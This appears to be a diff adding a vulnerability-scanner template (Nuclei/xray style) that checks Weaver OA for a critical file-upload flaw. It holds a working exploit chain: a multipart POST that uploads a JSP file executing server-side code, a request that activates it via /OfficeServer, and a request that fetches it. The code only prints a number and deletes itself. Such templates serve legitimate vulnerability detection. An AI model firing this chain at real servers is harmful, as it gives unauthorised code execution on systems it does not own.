@@ -1,0 +1,65 @@
+id: poc-yaml-weaver-oa-workrelate-file-upload
+
+info:
+  name: poc-yaml-weaver-oa-workrelate-file-upload
+  author: xiaobaicai
+  severity: critical
+  tags: xray-converted,fileupload,ct-456781
+
+http:
+  - raw:
+      - |
+        POST /workrelate/plan/util/uploaderOperate.jsp HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryVdb2RRl25PuaGhWj
+
+        ------WebKitFormBoundaryVdb2RRl25PuaGhWj
+        Content-Disposition: form-data; name="secId"
+        
+        1
+        ------WebKitFormBoundaryVdb2RRl25PuaGhWj
+        Content-Disposition: form-data; name="Filedata"; filename="{{rand_base(8)}}.jsp"
+        
+        <% out.println("{{rand_int(1000, 9999)}}"); new java.io.File(application.getRealPath(request.getServletPath())).delete(); %>
+        ------WebKitFormBoundaryVdb2RRl25PuaGhWj
+        Content-Disposition: form-data; name="plandetailid"
+        
+        1
+        ------WebKitFormBoundaryVdb2RRl25PuaGhWj--
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "fileid"
+  - raw:
+      - |
+        POST /OfficeServer HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryVdb2RRl25PuaGhWj
+
+        ------WebKitFormBoundaryVdb2RRl25PuaGhWj
+        Content-Disposition: form-data; name="aaa"
+        
+        {"OPTION":"INSERTIMAGE","isInsertImageNew":"1","imagefileid4pic":"{{id}}"}
+        ------WebKitFormBoundaryVdb2RRl25PuaGhWj--
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+  - raw:
+      - |
+        GET /{{rand_base(8)}}.jsp HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
